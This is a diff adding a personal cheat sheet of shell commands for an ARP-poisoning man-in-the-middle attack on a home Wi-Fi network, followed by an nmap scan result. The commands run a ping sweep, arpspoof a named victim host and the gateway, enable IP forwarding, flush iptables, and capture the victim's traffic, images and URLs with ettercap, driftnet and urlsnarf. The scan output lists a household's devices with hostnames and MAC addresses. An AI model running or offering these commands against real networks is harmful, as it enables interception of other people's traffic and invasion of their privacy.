@@ -1,0 +1,100 @@
+arpspoof from dsniff
+#USING CTR+C TO SUSPEND
+sudo nmap -sP 192.168.1.0/24
+sudo arpspoof -i wlan1 -t 192.168.1.120 -r 192.168.1.254
+
+#LISTENING IN ETTERCAP
+ettercap -Tq -i wlan1 -w ~/Desktop/cap
+
+sudo ifdown wlan1
+sudo ifup wlan1
+sudo ifdown wlan0
+sudo ifup wlan0
+port forwarding
+sysctl -w net.ipv4.ip_forward=1
+ifconfig
+
+###RESET IPTABLES WHENEVER CANT CONNECT TO THE INTERNET###
+iptables -F
+
+
+####ARP poisoning#####
+attack:192.168.1.114
+vic:192.168.1.120
+sudo arpspoof -i wlan1 -t 192.168.1.101 -r 192.168.1.254
+sudo arpspoof -i wlan1 -t 192.168.1.254 -r 192.168.1.101
+
+driftnet -i wlan1
+
+urlsnarf -i wlan1
+
+ettercap -Tq -i wlan1 -M arp /192.168.1.101// -w ~/Desktop/cap
+
+
+
+
+##RESULT#########################################################
+Starting Nmap 6.47 ( http://nmap.org ) at 2017-06-12 21:41 PDT
+Nmap scan report for uverse_DVR_ETH_84:96:d8:b8:c2:6c (192.168.1.64)
+Host is up (0.016s latency).
+MAC Address: 84:96:D8:B8:C2:6C (Pace plc)
+Nmap scan report for android-ca541d2b1c823f5d (192.168.1.68)
+Host is up (-0.089s latency).
+MAC Address: BC:E6:3F:AD:82:D3 (Unknown)
+Nmap scan report for unknownC03896E73285 (192.168.1.77)
+Host is up (-0.089s latency).
+MAC Address: C0:38:96:E7:32:85 (Hon Hai Precision Ind. Co.)
+Nmap scan report for unknown0025F061930D (192.168.1.79)
+Host is up (-0.089s latency).
+MAC Address: 00:25:F0:61:93:0D (Suga Electronics Limited)
+Nmap scan report for Loans-MBP (192.168.1.80)
+Host is up (0.023s latency).
+MAC Address: B8:E8:56:2D:DE:D8 (Apple)
+Nmap scan report for iPhone (192.168.1.84)
+Host is up (0.20s latency).
+MAC Address: 7C:01:91:37:5F:0D (Unknown)
+Nmap scan report for 192.168.1.86
+Host is up (-0.16s latency).
+MAC Address: 18:59:33:C5:F6:B6 (Cisco Spvtg)
+Nmap scan report for EX2700 (192.168.1.88)
+Host is up (-0.086s latency).
+MAC Address: 02:0F:B5:29:52:4F (Unknown)
+Nmap scan report for unknown020FB59E3AB8 (192.168.1.96)
+Host is up (-0.091s latency).
+MAC Address: 02:0F:B5:9E:3A:B8 (Unknown)
+Nmap scan report for HP28A1FC (192.168.1.98)
+Host is up (0.023s latency).
+MAC Address: DC:4A:3E:28:A1:FD (Unknown)
+Nmap scan report for unknown185933C6046E (192.168.1.100)
+Host is up (-0.17s latency).
+MAC Address: 18:59:33:C6:04:6E (Cisco Spvtg)
+Nmap scan report for android-b8914302332db7ac (192.168.1.101)
+Host is up (0.021s latency).
+MAC Address: AC:CF:85:29:3A:E4 (Unknown)
+Nmap scan report for unknown185933C5F6B6 (192.168.1.102)
+Host is up (0.010s latency).
+MAC Address: E8:5B:5B:4E:61:45 (LG Electronics)
+Nmap scan report for HP5BACF6 (192.168.1.103)
+Host is up (0.26s latency).
+MAC Address: FC:15:B4:AF:3A:41 (Hewlett Packard)
+Nmap scan report for localhost (192.168.1.115)
+Host is up (0.0054s latency).
+MAC Address: C0:97:27:56:2E:C8 (Unknown)
+Nmap scan report for 192.168.1.117
+Host is up (0.21s latency).
+MAC Address: 18:59:33:C6:04:6E (Cisco Spvtg)
+Nmap scan report for Lamegaton (192.168.1.120)
+Host is up (0.010s latency).
+MAC Address: 02:0F:B5:5B:BD:00 (Unknown)
+Nmap scan report for 192.168.1.122
+Host is up (0.0080s latency).
+MAC Address: 18:59:33:C5:F6:B6 (Cisco Spvtg)
+Nmap scan report for Enlighten (192.168.1.128)
+Host is up (-0.086s latency).
+MAC Address: 4C:BB:58:BA:9C:16 (Chicony Electronics Co.)
+Nmap scan report for homeportal (192.168.1.254)
+Host is up (0.0043s latency).
+MAC Address: 14:ED:BB:FA:7B:A5 (Unknown)
+Trying to delete NSI, but could not find 1 of the purportedly pending events on that IOD.
+
+QUITTING!
